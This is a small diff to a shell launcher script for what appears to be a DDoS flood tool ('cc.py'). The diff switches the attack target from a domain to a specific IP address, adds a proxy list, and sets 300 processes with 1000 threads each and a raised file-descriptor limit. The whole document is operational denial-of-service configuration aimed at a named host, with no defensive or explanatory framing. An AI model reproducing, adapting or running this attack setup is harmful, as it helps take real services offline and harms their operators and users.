@@ -6,10 +6,10 @@
 #  Lastly run this script
 #
 #the command you want to exec
-atk_cmd="python3 cc.py -url https://ventox.lol -v 4 -s 999"
+atk_cmd="python cc.py -url https://176.9.16.251 -f proxy.txt -v 5 -s 300 -t 1000"
 
 #number of process that you want
-process=500
+process=300
 
 #change the system limit
 ulimit -n 9999999
